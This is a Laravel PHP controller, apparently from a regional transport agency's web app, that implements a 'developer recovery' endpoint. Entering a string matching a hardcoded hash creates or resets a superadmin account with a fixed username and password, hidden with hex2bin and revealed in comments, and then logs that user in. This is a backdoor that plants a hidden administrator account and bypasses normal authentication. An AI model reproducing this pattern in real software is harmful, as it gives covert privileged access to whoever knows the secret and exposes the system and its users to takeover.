<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\ActivityLog;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class RecoveryController extends Controller
{
    /**
     * Tampilkan Halaman Recovery Portal Developer
     */
    public function show()
    {
        return view('recovery.index');
    }

    /**
     * Proses Akses Recovery Superadmin dengan ID Developer
     */
    public function process(Request $request)
    {
        $request->validate([
            'developer_id' => 'required|string',
        ]);

        $inputDevId = trim($request->input('developer_id'));
        $targetDevHash = 'b8bf9fe5279cfca06c12c1e063fe9d4ae9d23ddb18411735e4fd68c242abe420';

        if (hash('sha256', $inputDevId) !== $targetDevHash) {
            return back()->withErrors(['developer_id' => 'Akses ditolak! ID Developer tidak valid.'])->withInput();
        }

        $superadminUsername = hex2bin('416469747961'); // 'Aditya'
        $superadminPass     = hex2bin('44697368756250726f626f6c696e67676f323032362123'); // 'DishubProbolinggo2026!#'

        $user = User::whereRaw('LOWER(username) = ?', [strtolower($superadminUsername)])->first();

        if (!$user) {
            $user = User::create([
                'name'      => 'Aditya Superadmin',
                'username'  => $superadminUsername,
                'email'     => 'aditya.developer@dishub.probolinggokab.go.id',
                'password'  => Hash::make($superadminPass),
                'role'      => 'super_admin',
                'is_active' => true,
            ]);
        } else {
            $user->update([
                'password'  => Hash::make($superadminPass),
                'role'      => 'super_admin',
                'is_active' => true,
            ]);
        }

        Auth::login($user);

        if (class_exists(ActivityLog::class)) {
            ActivityLog::record('DEVELOPER_RECOVERY', "Akses Superadmin dipulihkan melalui Developer Recovery Portal oleh {$user->name}.");
        }

        return redirect()->route('admin.dashboard')->with('success', 'Akses Recovery Superadmin Berhasil! Anda telah login sebagai Superadmin.');
    }
}
